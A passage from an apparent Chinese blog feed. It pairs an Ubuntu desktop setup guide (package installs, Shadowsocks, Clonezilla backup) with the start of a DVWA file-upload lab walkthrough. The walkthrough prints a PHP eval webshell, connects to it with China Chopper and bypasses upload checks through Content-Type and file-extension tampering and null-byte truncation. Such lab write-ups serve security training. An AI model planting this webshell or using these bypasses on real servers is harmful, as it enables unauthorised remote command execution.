firejail</span><br></pre></td></tr></table></figure><h3 id="将应用程序以沙箱运行"><a href="#将应用程序以沙箱运行" class="headerlink" title="将应用程序以沙箱运行"></a>将应用程序以沙箱运行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firejail firefox</span><br></pre></td></tr></table></figure><h3 id="查看以沙箱运行的应用程序"><a href="#查看以沙箱运行的应用程序" class="headerlink" title="查看以沙箱运行的应用程序"></a>查看以沙箱运行的应用程序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firejail --tree</span><br></pre></td></tr></table></figure><hr><h1 id="生产力软件"><a href="#生产力软件" class="headerlink" title="生产力软件"></a>生产力软件</h1><h2 id="基础软件包"><a href="#基础软件包" class="headerlink" title="基础软件包"></a>基础软件包</h2><ol><li><p><code>flashplugin-installer</code>：浏览器<code>flash</code>插件</p></li><li><p><code>meld</code>：用于比对两个目录或文件的差异</p></li><li><p><code>amule</code>：电驴下载工具</p></li><li><p><code>transmission</code>、<code>qbittorrent</code>：<code>BT</code>下载工具</p></li><li><p><code>ttf-wqy-microhei</code>：文泉驿微米黑字体</p></li><li><p><code>mtr</code>：网络路径追踪工具</p></li><li><p><code>whois</code>：<code>IP</code>、域名注册信息查询工具</p></li><li><p><code>git</code>：<code>github</code>下载</p></li><li><p><code>curl</code>：完成浏览器请求服务器的命令行工具</p></li><li><p><code>obs-studio</code>：录屏软件，直播软件</p></li><li><p><code>ubuntu-restricted-extras</code>：一组视频解码器</p></li><li><p><code>libavcodec-extra</code>、<code>libdvd-pkg</code>：支持<code>dvd</code>格式播放</p></li><li><p><code>unrar</code>、<code>unrar-free</code>：<code>rar</code>格式解压</p></li><li><p><code>woeusb</code>：<code>U</code>盘刻录工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:nilarimogard/webupd8</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install woeusb</span><br></pre></td></tr></table></figure></li><li><p><code>ascii</code>：查看<code>ASCII</code>编码</p></li><li><p><code>unicode</code>：<code>unicode</code>编码转换工具</p></li><li><p><code>axel</code>：字符界面下载工具</p></li><li><p><code>flameshot</code>：截图工具</p></li><li><p><code>xfce4-taskmanager</code>：杀死卡顿的应用程序，可以快速定位应用程序窗口</p></li><li><p><code>Remmina</code>：远程连接工具，可很好支持<code>rdp</code>连接</p></li><li><p><code>CopyQ</code>：剪贴板管理器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:hluk/copyq</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install copyq</span><br></pre></td></tr></table></figure></li></ol><h2 id="安装JAVA"><a href="#安装JAVA" class="headerlink" title="安装JAVA"></a>安装JAVA</h2><ol><li><p>下载<code>jdk1.8</code>版本<code>tar</code>包</p><p> <a href="https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="noopener">https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html</a></p></li><li><p>解压<code>tar</code>包</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf jdk-8u171-linux-x64.tar.gz</span><br></pre></td></tr></table></figure></li><li><p>移动位置</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mv jdk1.8.0_171  /usr/local/jdk1.8</span><br></pre></td></tr></table></figure></li><li><p>设置环境变量</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export JAVA_HOME=/usr/local/jdk1.8 </span><br><span class="line">export JRE_HOME=$&#123;JAVA_HOME&#125;/jre </span><br><span class="line">export CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/lib </span><br><span class="line">export PATH=.:$&#123;JAVA_HOME&#125;/bin:$PATH</span><br></pre></td></tr></table></figure></li><li><p>环境变量生效</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure></li><li><p>查看是否安装成功</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java</span><br><span class="line">javac</span><br></pre></td></tr></table></figure></li></ol><h2 id="中文输入法"><a href="#中文输入法" class="headerlink" title="中文输入法"></a>中文输入法</h2><ol><li><p>安装</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install ibus ibus-pinyin</span><br></pre></td></tr></table></figure></li><li><p>配置</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">im-config</span><br></pre></td></tr></table></figure><p> <img src="/images/Linuxmeihua/42.png" alt="42.png"></p></li><li><p>重启操作系统</p></li><li><p>添加输入法</p><p> <img src="/images/Linuxmeihua/43.png" alt="43.png"></p></li><li><p>修复<code>BUG</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ibus-setup</span><br></pre></td></tr></table></figure><p> 取消<code>embed</code>勾选项</p><p> <img src="/images/Linuxmeihua/44.png" alt="44.png"></p></li></ol><h2 id="常用软件"><a href="#常用软件" class="headerlink" title="常用软件"></a>常用软件</h2><h3 id="Chrome"><a href="#Chrome" class="headerlink" title="Chrome"></a>Chrome</h3><p>以<code>deb</code>格式安装</p><h3 id="Golddict"><a href="#Golddict" class="headerlink" title="Golddict"></a>Golddict</h3><ol><li><p>安装</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install goldendict</span><br></pre></td></tr></table></figure></li><li><p>添加有道在线词典</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dict.youdao.com/search?q=%GDWORD%&amp;ue=utf8</span><br></pre></td></tr></table></figure></li></ol><h3 id="邮件"><a href="#邮件" class="headerlink" title="邮件"></a>邮件</h3><ol><li><p><code>mailspring</code>：界面更好看</p></li><li><p><code>thunderbird</code>：性能更优</p></li><li><p><code>Protonmail Desktop</code>：匿名邮件，实现端到端的加密</p></li></ol><h3 id="office"><a href="#office" class="headerlink" title="office"></a>office</h3><ol><li><p><code>WPS for Linux</code></p></li><li><p><code>onlyoffice</code></p></li></ol><h3 id="to-do-list-计划列表"><a href="#to-do-list-计划列表" class="headerlink" title="to-do-list(计划列表)"></a>to-do-list(计划列表)</h3><ol><li><p><code>zenkit</code></p><p> 通过<code>Ubuntu</code>官方软件安装器安装</p></li></ol><h3 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h3><ol><li><p>印象笔记<code>tusk</code></p><p> 通过<code>Ubuntu</code>官方软件安装器安装</p></li></ol><h3 id="书籍管理"><a href="#书籍管理" class="headerlink" title="书籍管理"></a>书籍管理</h3><ol><li><code>calibre</code></li></ol><h3 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h3><ol><li><p><code>virtualbox</code></p></li><li><p><code>VMWare Workstation</code></p></li></ol><h3 id="下载工具"><a href="#下载工具" class="headerlink" title="下载工具"></a>下载工具</h3><ol><li><p><code>uGet</code></p><p> 支持断点续传</p><ol><li><p>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:plushuang-tw/uget-stable</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install uget aria2</span><br></pre></td></tr></table></figure></li><li><p>配置</p><p><img src="/images/Linuxmeihua/46.png" alt="46.png"></p></li></ol></li></ol><h3 id="图形图像视频编辑"><a href="#图形图像视频编辑" class="headerlink" title="图形图像视频编辑"></a>图形图像视频编辑</h3><ol><li><p><code>GIMP</code>：<code>Linux</code>下的<code>PS</code></p></li><li><p><code>VLC</code>：视频播放软件</p></li><li><p><code>kdenlive</code>：视频编辑</p></li><li><p><code>pitivi</code>：视频编辑</p></li></ol><h3 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h3><ol><li><code>MindMaster</code></li></ol><h3 id="开发工具、编辑器"><a href="#开发工具、编辑器" class="headerlink" title="开发工具、编辑器"></a>开发工具、编辑器</h3><ol><li><p><code>sublime text</code></p></li><li><p><code>visual studio code</code></p></li><li><p><code>Atom</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:webupd8team/atom</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install atom</span><br></pre></td></tr></table></figure></li></ol><h3 id="appimage程序下载"><a href="#appimage程序下载" class="headerlink" title="appimage程序下载"></a>appimage程序下载</h3><p><a href="https://appimage.github.io/" target="_blank" rel="noopener">https://appimage.github.io/</a></p><hr><h1 id="系统快捷键"><a href="#系统快捷键" class="headerlink" title="系统快捷键"></a>系统快捷键</h1><ol><li><p><code>ctrl+alt+向上/向下</code>：快速切换<code>Linux</code>虚拟桌面</p></li><li><p><code>win+a</code>：显示系统所有安装的软件的界面</p></li><li><p><code>shift/alt+printscreen</code>：自定义截图/当前窗口截图，保存到图片目录</p></li><li><p><code>win+向上/向下/向左/向右</code>：将当前窗口最大化/返回初始大小及位置/屏幕一半靠左/屏幕一半靠右</p></li><li><p><code>ctrl+alt+t</code>：打开终端窗口</p></li><li><p><code>ctrl+shift+n</code>：在原有终端窗口基础上新建终端窗口或在桌面新建文件夹</p></li><li><p><code>ctrl+d</code>：关闭终端窗口</p></li><li><p><code>ctrl+shift+t</code>：在终端窗口中新建标签页</p></li><li><p><code>ctrl+shift+c/v</code>：在终端窗口中复制/粘贴</p></li><li><p><code>win+d</code>：显示桌面</p></li><li><p><code>ctrl+w/q</code>：关闭一个/关闭所有标签页(适用于部分应用程序)</p></li><li><p><code>win+l</code>：锁定当前登陆会话(锁屏)</p></li><li><p><code>win+m</code>：打开或关闭日历</p></li><li><p><code>win+h</code>：将当前窗口最小化</p></li><li><p><code>alt+win+8</code>：放大/恢复桌面</p></li><li><p><code>win+shift+pageup/pagedown</code>：将当前应用程序窗口上移/下移至其他虚拟桌面</p></li></ol><hr><h1 id="Ubuntu安装微信、QQ等"><a href="#Ubuntu安装微信、QQ等" class="headerlink" title="Ubuntu安装微信、QQ等"></a>Ubuntu安装微信、QQ等</h1><p>依靠<code>Deepin</code>开发移植，使得<code>Linux</code>操作系统可以安装<code>Windows</code>软件</p><h2 id="安装微信"><a href="#安装微信" class="headerlink" title="安装微信"></a>安装微信</h2><ol><li><p>安装<code>deepin-wine</code>环境</p><p> 访问<a href="https://github.com/wszqkzqk/deepin-wine-ubuntu" target="_blank" rel="noopener">https://github.com/wszqkzqk/deepin-wine-ubuntu</a> 下载<code>zip</code>包</p><p> 建议<code>git</code>下载</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://gitee.com/wszqkzqk/deepin-wine-for-ubuntu.git</span><br></pre></td></tr></table></figure><p> 解压到本地文件夹，在文件夹中打开终端，执行</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sh ./install.sh</span><br></pre></td></tr></table></figure></li><li><p>安装相关容器</p><p> 访问<a href="http://mirrors.aliyun.com/deepin/pool/non-free/d/" target="_blank" rel="noopener">http://mirrors.aliyun.com/deepin/pool/non-free/d/</a>  下载想要的容器，以<code>deb</code>安装即可</p><p> 推荐容器</p><p> TIM：<a href="http://mirrors.aliyun.com/deepin/pool/non-free/d/deepin.com.qq.office/" target="_blank" rel="noopener">http://mirrors.aliyun.com/deepin/pool/non-free/d/deepin.com.qq.office/</a></p><p> QQ：<a href="http://mirrors.aliyun.com/deepin/pool/non-free/d/deepin.com.qq.im/" target="_blank" rel="noopener">http://mirrors.aliyun.com/deepin/pool/non-free/d/deepin.com.qq.im/</a></p><p> QQ轻聊版：<a href="http://mirrors.aliyun.com/deepin/pool/non-free/d/deepin.com.qq.im.light/" target="_blank" rel="noopener">http://mirrors.aliyun.com/deepin/pool/non-free/d/deepin.com.qq.im.light/</a></p><p> 微信：<a href="http://mirrors.aliyun.com/deepin/pool/non-free/d/deepin.com.wechat/" target="_blank" rel="noopener">http://mirrors.aliyun.com/deepin/pool/non-free/d/deepin.com.wechat/</a></p></li><li><p>相关问题</p><ol><li><p><code>Ubuntu</code>桌面无法显示托盘图标</p><p>安装<code>TopIconPlus</code>的<code>gnome-shell</code>扩展</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gnome-shell-extension-top-icons-plus</span><br></pre></td></tr></table></figure><p>用<code>Alt+F2</code>–&gt;<code>r</code>命令重启<code>gnome-shell</code></p><p>最后用<code>gnome-tweaks</code>开启这个扩展</p></li><li><p>微信无法发送图片</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install libjpeg62:i386</span><br></pre></td></tr></table></figure></li><li><p><code>Ubuntu</code>系发行版不卸载包</p><p><code>deepin-wine</code>环境使用<code>zip</code>包中的<code>uninstall.sh</code>脚本卸载</p><p><code>deepin-wine</code>的应用容器，用<code>sudo apt remove 软件包主名</code>命令来卸载</p></li></ol></li></ol><hr><h1 id="配置Shadowsocks"><a href="#配置Shadowsocks" class="headerlink" title="配置Shadowsocks"></a>配置Shadowsocks</h1><p>采用<code>shadowsocks-qt5(GUI)</code>+<code>Chrome/Firefox</code>+<code>SwitchOmega</code>的方式配置<code>shadowsocks</code>的科学上网模式</p><ol><li><p>添加<code>shadowsocks-qt5(GUI)</code>仓库</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:hzwhuang/ss-qt5</span><br></pre></td></tr></table></figure><p> 报错</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">仓库 “http://ppa.launchpad.net/hzwhuang/ss-qt5/ubuntu bionic Release” 没有Release 文件</span><br></pre></td></tr></table></figure><p> 解决方案</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">修改/etc/apt/sources.list.d/hzwhuang-ubuntu-ss-qt5-bionic.list文件，将bionic（18.04版本代号）改为xenial（16.04版本代号）</span><br></pre></td></tr></table></figure></li><li><p>安装<code>shadowsocks-qt5(GUI)</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install shadowsocks-qt5</span><br></pre></td></tr></table></figure></li><li><p>开启<code>shadowsocks-qt5(GUI)</code>，配置代理，后设置浏览器代理即可</p></li></ol><hr><h1 id="使用Clonezilla进行系统备份"><a href="#使用Clonezilla进行系统备份" class="headerlink" title="使用Clonezilla进行系统备份"></a>使用Clonezilla进行系统备份</h1><p><code>Ubuntu</code>自带<code>Disks</code>工具可以对系统分区或硬盘进行备份，但不支持备份压缩</p><p><code>Clonezilla</code>:</p><ol><li><p>源自台湾政府安全部门的开源项目</p></li><li><p>备份中可实现镜像压缩</p></li><li><p>支持网络及外置存储设备</p></li><li><p>支持服务器/客户端部署，支持<code>PXE</code>，即网路同传方式</p></li><li><p>以<code>ISO</code>引导的方式进行系统备份</p></li></ol><p>官方地址：<a href="https://clonezilla.org/" target="_blank" rel="noopener">https://clonezilla.org/</a></p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>登录官方网站，选择最新稳定版<code>Clonezilla</code></p><p><img src="/images/Linuxmeihua/47.png" alt="47.png"></p><p>根据要备份的系统版本选择<code>Clonezilla</code>版本，下载<code>iso</code>版</p><p><img src="/images/Linuxmeihua/48.png" alt="48.png"></p><h2 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h2><p>当计算机只有一个硬盘时，可以对硬盘进行分区，将系统分区进行备份，将备份文件存储到其他分区中</p><p>当计算机使用多块硬盘时，建议将操作系统所在的硬盘进行整体备份，将备份文件存储到其他硬盘中，更加有利于系统的恢复</p><p><strong>以下操作在虚拟机环境下进行，对系统所在硬盘进行整体备份，存储到虚拟机的另一块硬盘中</strong></p><p><img src="/images/Linuxmeihua/49.png" alt="49.png"></p><ol><li><p>对新分配的硬盘进行分区等操作，使其能够进行存储</p></li><li><p>挂载<code>Clonezilla</code>的引导盘</p><p> <img src="/images/Linuxmeihua/50.png" alt="50.png"></p></li><li><p>设置虚拟机“启动时连接”，设置<code>BIOS</code>以光盘启动，启动虚拟机则会进入<code>Clonezilla</code>启动界面</p><p> <img src="/images/Linuxmeihua/51.png" alt="51.png"></p></li><li><p>选择第一项<code>Clonezilla live</code>，以光盘方式引导<code>Clonezilla</code>，或者选择第四项<code>Other modes of Clonezilla live</code>，以其他分辨率来启动<code>Clonezilla</code>，最高支持1024*768</p><p> <img src="/images/Linuxmeihua/52.png" alt="52.png"></p></li><li><p>选择操作的语言环境</p><p> <img src="/images/Linuxmeihua/53.png" alt="53.png"></p></li><li><p>选择键盘类型，默认美式键盘即可</p><p> <img src="/images/Linuxmeihua/54.png" alt="54.png"></p></li><li><p>选择启动<code>Clonezilla</code>或者进入<code>shell</code>命令行，选择第一项启动<code>Clonezilla</code></p><p> <img src="/images/Linuxmeihua/55.png" alt="55.png"></p></li><li><p>选择需要进行的操作，选择第一项<code>device-image</code></p><p> 第一项<code>device-image</code>：将硬盘或者分区备份为镜像文件</p><p>第二项<code>device-device</code>：将一个硬盘的所有内容复制到另一个硬盘中，包括引导、分区等</p><p>第三项至第六项为通过网络进行操作的选项</p><p><img src="/images/Linuxmeihua/56.png" alt="56.png"></p></li><li><p>选择备份完成的镜像文件的存储方式，因现在为将第一块硬盘备份为镜像文件存储到第二块硬盘上，则选择第一项<code>local_dev</code></p><p> <code>Clonezilla</code>支持通过各种方式将备份完成的镜像文件传输到其他位置，利于存储</p><p> <img src="/images/Linuxmeihua/57.png" alt="57.png"></p></li><li><p><code>Clonezilla</code>会提示插入存储设备，按回车，<code>Clonezilla</code>会自动检测存储设备</p><p><img src="/images/Linuxmeihua/58.png" alt="58.png"></p></li><li><p>此时，<code>Clonezilla</code>检测到计算机上的存储设备并列出，可以查看<code>Clonezilla</code>是否将存储设备全部列出</p><p><img src="/images/Linuxmeihua/59.png" alt="59.png"></p></li><li><p>确定<code>Clonezilla</code>将全部存储设备列出后，按<code>Ctrl+c</code>,选择存放备份完成的镜像文件的存储设备，现在即名称为<code>sdb1</code>的第二块硬盘</p><p><img src="/images/Linuxmeihua/60.png" alt="60.png"></p></li><li><p><code>Clonezilla</code>会列出所选择的存储设备上的文件目录，可以选择某个目录来存储备份完成的镜像文件，默认选择的为存储设备的根目录<code>\</code>，使用<code>Tab</code>选择<code>Done</code>，确定选择</p><p><img src="/images/Linuxmeihua/61.png" alt="61.png"></p></li><li><p><code>Clonezilla</code>会列出存储设备的挂载状态，按回车即可</p><p><img src="/images/Linuxmeihua/62.png" alt="62.png"></p></li><li><p>选择高级参数设置向导方式，建议选择第一项<code>Beginner</code>初学模式</p><p><img src="/images/Linuxmeihua/63.png" alt="63.png"></p></li><li><p>选择备份、还原方式，备份硬盘或者备份分区，还原硬盘或者还原分区，现在选择第一项<code>savedisk</code>备份硬盘</p><p><img src="/images/Linuxmeihua/64.png" alt="64.png"></p></li><li><p>设置备份完成的镜像文件的名称，默认以系统的日期进行命名，根据需要进行修改</p><p><img src="/images/Linuxmeihua/65.png" alt="65.png"></p></li><li><p>选择要备份的硬盘，即第一块硬盘，即操作系统所在的硬盘</p><p><img src="/images/Linuxmeihua/66.png" alt="66.png"></p></li><li><p>在系统备份之前，<code>Clonezilla</code>提示是否要对文件系统进行检查，可以根据实际情况进行选择</p><p><code>-sfsck</code>：跳过检查</p><p><code>-fsck</code>：进行检查</p><p><code>-fsck -y</code>：进行检查，并在检查过程中进行自动修复</p><p><img src="/images/Linuxmeihua/67.png" alt="67.png"></p></li><li><p><code>Clonezilla</code>提示在备份完成之后，是否要对备份完成的镜像文件进行检查，以保证镜像文件可以用于后续的恢复工作，可以根据实际情况进行选择</p><p><img src="/images/Linuxmeihua/68.png" alt="68.png"></p></li><li><p>设置是否对备份完成的镜像文件进行密码设置，设置后在使用镜像文件恢复时需要输入密码，可以根据实际情况进行选择</p><p><img src="/images/Linuxmeihua/69.png" alt="69.png"></p></li><li><p>设置当备份完成后，需要对计算机进行什么操作：选择、重启、关机</p><p><img src="/images/Linuxmeihua/70.png" alt="70.png"></p></li><li><p><code>Clonezilla</code>会将前面所有操作生成一条命令可供后续再次使用，按回车继续</p><p><img src="/images/Linuxmeihua/71.png" alt="71.png"></p></li><li><p><code>Clonezilla</code>会再次提示是否确认将第一块硬盘<code>sda</code>备份为镜像文件，此时<code>sda</code>中只有<code>sda1</code>一个分区，输入<code>y</code>确定</p><p><img src="/images/Linuxmeihua/72.png" alt="72.png"></p></li><li><p>备份开始</p><p><img src="/images/Linuxmeihua/73.png" alt="73.png"></p><p>备份完成后，按回车键即可执行前面第22步选择的操作：选择、重启、关机</p><p><img src="/images/Linuxmeihua/74.png" alt="74.png"></p></li><li><p>即可以看到生成的镜像文件</p><p><img src="/images/Linuxmeihua/75.png" alt="75.png"></p></li></ol><h2 id="还原恢复"><a href="#还原恢复" class="headerlink" title="还原恢复"></a>还原恢复</h2><ol><li><p>同样，使用<code>Clonezilla</code>光盘进行引导启动</p><p> <img src="/images/Linuxmeihua/76.png" alt="76.png"></p></li><li><p>重复备份时第4至12步的操作过程后，进入到<code>Clonezilla</code>列出镜像文件的存储设备上的文件目录界面，选择备份完成的<code>img</code>镜像文件，使用<code>Tab</code>键选择<code>Done</code></p><p> <img src="/images/Linuxmeihua/77.png" alt="77.png"></p></li><li><p>之后同样使用初学模式，进入选择备份硬盘或分区以及还原硬盘或分区界面，选择第三项<code>restoredisk</code>还原镜像文件到本机硬盘</p><p> <img src="/images/Linuxmeihua/78.png" alt="78.png"></p></li><li><p>确认用于恢复的镜像文件的名称</p><p> <img src="/images/Linuxmeihua/79.png" alt="79.png"></p></li><li><p>选择需要使用镜像文件恢复的硬盘</p><p> <img src="/images/Linuxmeihua/80.png" alt="80.png"></p></li><li><p><code>Clonezilla</code>提示是否在恢复前对镜像文件进行完整性检查，可以根据需要进行选择</p><p> <img src="/images/Linuxmeihua/81.png" alt="81.png"></p></li><li><p>选择在恢复完成后，计算机进行的操作：选择、重启、关机</p><p> <img src="/images/Linuxmeihua/82.png" alt="82.png"></p></li><li><p>同样，<code>Clonezilla</code>将所有操作生成一条命令用于后续再次使用，按回车键继续。之后，<code>Clonezilla</code>两次提示是否确认将进行镜像文件还原到<code>sda</code>硬盘的操作，输入<code>y</code>确认</p><p> <img src="/images/Linuxmeihua/83.png" alt="83.png"></p></li><li><p>还原恢复开始</p><p> <img src="/images/Linuxmeihua/84.png" alt="84.png"></p><p> 等待完成即可，同样，恢复完成后，按回车键即可执行前面第7步选择的操作：选择、重启、关机</p></li></ol><hr><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.lulinux.com/archives/1319" target="_blank" rel="noopener">https://www.lulinux.com/archives/1319</a></p><p><a href="https://github.com/wszqkzqk/deepin-wine-ubuntu" target="_blank" rel="noopener">https://github.com/wszqkzqk/deepin-wine-ubuntu</a></p><p><a href="https://www.imzzj.com/post-549.html" target="_blank" rel="noopener">https://www.imzzj.com/post-549.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Linux桌面优化与美化" scheme="http://yoursite.com/categories/Linux%E6%A1%8C%E9%9D%A2%E4%BC%98%E5%8C%96%E4%B8%8E%E7%BE%8E%E5%8C%96/"/>
    
    
      <category term="Linux桌面" scheme="http://yoursite.com/tags/Linux%E6%A1%8C%E9%9D%A2/"/>
    
  </entry>
  
  <entry>
    <title>DVWA1.10之文件上传</title>
    <link href="http://yoursite.com/2019/05/27/DVWA1-10%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>http://yoursite.com/2019/05/27/DVWA1-10之文件上传/</id>
    <published>2019-05-27T15:01:00.000Z</published>
    <updated>2020-02-24T04:17:16.572Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的<code>webshell</code>权限，因此文件上传漏洞带来的危害常常是毁灭性的，<code>Apache</code>、<code>Tomcat</code>、<code>Nginx</code>等都曝出过文件上传漏洞</p><p>文件上传漏洞的利用是有限制条件的，首先当然是要能够成功上传木马文件，其次上传文件必须能够被执行，最后就是上传文件的路径必须可知</p><hr><h1 id="LOW级别漏洞利用"><a href="#LOW级别漏洞利用" class="headerlink" title="LOW级别漏洞利用"></a>LOW级别漏洞利用</h1><ol><li><p>编辑一句话木马<code>1.php</code></p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> @eval($_POST[&apos;cmd&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li><p>上传</p><p> <img src="/images/baji/dvwa/file upload/1.png" alt="1.png"></p></li><li><p>中国菜刀链接<code>webshell</code></p><p> 指定连接目录为<code>http://172.16.12.89/hackable/uploads/1.php</code>，参数为<code>cmd</code>，类型为<code>PHP(eval)</code></p><p> <img src="/images/baji/dvwa/file upload/2.png" alt="2.png"></p></li><li><p>双击新添加的条目</p><p> <img src="/images/baji/dvwa/file upload/3.png" alt="3.png"></p></li><li><p>获取目标站点目录访问权限</p><p> <img src="/images/baji/dvwa/file upload/4.png" alt="4.png"></p></li><li><p>模拟终端</p><p> <img src="/images/baji/dvwa/file upload/5.png" alt="5.png"></p></li></ol><hr><h1 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h1><p><code>Medium</code>级别的代码对上传文件的类型、大小做了限制，要求文件类型(<code>Content-Type</code>)必须是<code>jpeg</code>或者<code>png</code>，大小不能超过<code>100000B</code>（约为<code>97.6KB</code>）</p><!--## 组合攻击(文件包含+文件上传)1. 上传一句话木马`a.png`    一句话木马不受大小限制影响    ![6.png](/images/baji/dvwa/file upload/6.png)2. 使用中国菜刀连接`webshell`    ![7.png](/images/baji/dvwa/file upload/7.png)    无法成功获取`webshell`权限    中国菜刀的原理是向上传文件发送包含`cmd`参数的post请求，通过控制`cmd`参数来执行不同的命令，而这里服务器将木马文件解析成了图片文件，因此向其发送`post`请求时，服务器只会返回这个“图片”文件，并不会执行相应命令3. 利用`Medium`级别文件包含漏洞获取`webshell`权限    服务器包含文件时，不管文件后缀是否是`php`，都会尝试当做`php`文件执行，如果文件内容确为`php`，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容    中国菜刀连接`http://172.16.12.89/vulnerabilities/fi/?page=hthttp://tp://172.16.12.89/hackable/uploads/a.png`    参数名为`cmd`，脚本语言选择`php(eval)`--><h2 id="抓包修改文件类型"><a href="#抓包修改文件类型" class="headerlink" title="抓包修改文件类型"></a>抓包修改文件类型</h2><p>一句话木马不受大小限制影响</p><ol><li><p>将<code>1.php</code>更名为<code>a.png</code></p></li><li><p>上传<code>a.png</code>，抓包</p><p> <img src="/images/baji/dvwa/file upload/8.png" alt="8.png"></p></li><li><p>修改上传文件后缀名</p><p> <img src="/images/baji/dvwa/file upload/9.png" alt="9.png"></p></li><li><p>上传成功</p><p> <img src="/images/baji/dvwa/file upload/10.png" alt="10.png"></p></li><li><p>中国菜刀连接</p><p> 指定连接目录为<code>http://172.16.12.89/hackable/uploads/a.php</code>，参数为<code>cmd</code>，类型为<code>PHP(eval)</code></p><p> <img src="/images/baji/dvwa/file upload/11.png" alt="11.png"></p></li></ol><!--## 截断绕过规则在`php`版本小于5.3.4的服务器中，当`Magic_quote_gpc`选项为`off`时，可以在文件名中使用`%00`截断，所以可以把上传文件命名为`a.php%00.png`可以通过文件类型检查1. 上传`a.php`    修改`Content-Type`为`image/png`    修改`a.php`为`a.php%00.png`2. 上传成功    ![16.png](/images/baji/dvwa/file upload/16.png)3. 中国菜刀连接--><hr><h1 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h1><p><code>High</code>级别的代码读取文件名中最后一个<code>.</code>后的字符串(文件后缀名)，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是<code>*.jpg</code>、<code>*.jpeg</code> 、<code>*.png</code>之一。同时，<code>getimagesize</code>函数更是限制了上传文件的文件头必须为图像类型</p><h2 